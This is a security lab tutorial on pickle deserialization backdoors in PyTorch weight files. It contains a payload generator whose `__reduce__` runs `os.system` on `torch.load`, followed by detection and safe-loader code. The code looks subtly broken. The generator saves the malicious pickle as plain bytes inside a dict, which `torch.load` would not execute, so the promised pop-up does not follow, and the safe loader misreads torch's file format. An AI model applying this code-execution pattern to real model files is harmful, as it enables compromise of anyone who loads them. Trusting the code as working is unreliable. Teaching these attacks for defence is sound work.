# Pickle Backdoor Lab

> Craft and detect a malicious PyTorch weight file that executes code on load\
> **Difficulty:** 🌶️🌶️ Medium–High  **Time:** 20–25 min

***

### 🖥️ 1. Launch the Lab

| Option           | How                                                                                                                        |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------- |
| **Google Colab** | [Open in Colab](https://colab.research.google.com/github/codemedici/llm-security-labs/blob/main/pickle_backdoor_lab.ipynb) |
| **Local Python** | `bash\npip install torch\npython pickle_backdoor_lab.py`                                                                   |

***

### 🎯 2. Objectives

1. **Build** a malicious `.pt` file that spawns `calc` (macOS) or opens Notepad (Windows) on load.
2. **Verify** exploitation via `torch.load()`.
3. **Detect & Mitigate** using `pickletools.dis` and safe-loader pattern.

***

### 🧑‍💻 3. Crafting the Payload

<details>

<summary>payload_generator.py</summary>

```python
import os, pickle, torch, io

class RCE:
    def __reduce__(self):
        cmd = "open -a Calculator" if os.uname().sysname == "Darwin" else "notepad"
        return (os.system, (cmd,))

payload = RCE()
buf = io.BytesIO()
pickle.dump(payload, buf)            # malicious pickle bytes

# wrap into fake state_dict so torch.load() accepts it
torch.save({"model": buf.getvalue()}, "exploit_weights.pt")
print("exploit_weights.pt created!")
```

</details>

***

### 🔥 4. Exploitation Test

```python
import torch
torch.load("exploit_weights.pt")     # 🎉 Notepad / Calculator pops !
```

***

### 🔍 5. Detection & Mitigation

#### 5.1 Static Analysis

```python
import pickletools
with open("exploit_weights.pt", "rb") as f:
    pickletools.dis(f)   # look for GLOBAL os system, etc.
```

#### 5.2 Safe Loader Pattern

```python
import torch, io, pickle, types

SAFE_BUILTINS = {"builtins": {"list", "dict", "set"}}

class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in SAFE_BUILTINS and name in SAFE_BUILTINS[module]:
            return super().find_class(module, name)
        raise pickle.UnpicklingError("Unsafe pickle!")

def safe_torch_load(path):
    with open(path, "rb") as f:
        data = f.read()
    return SafeUnpickler(io.BytesIO(data)).load()

# safe_torch_load("exploit_weights.pt")  -> raises error
```

#### 5.3 CI/CD Guard

* Reject model files > 100 MB _and_ containing custom classes.
* Require SHA-256 allow-list for production weights.

***

### 📝 6. Reflection Questions

1. How would this payload differ for `keras.models.load_model()`?
2. Can pickle abuse bypass container isolation?
3. Which runtime (e.g., TorchScript) mitigates this class of threat?

***

#### 📚 Related Notebook Links

* Pickle Deserialization and Unsafe Model Loading
* Supply Chain & Serialization Risks
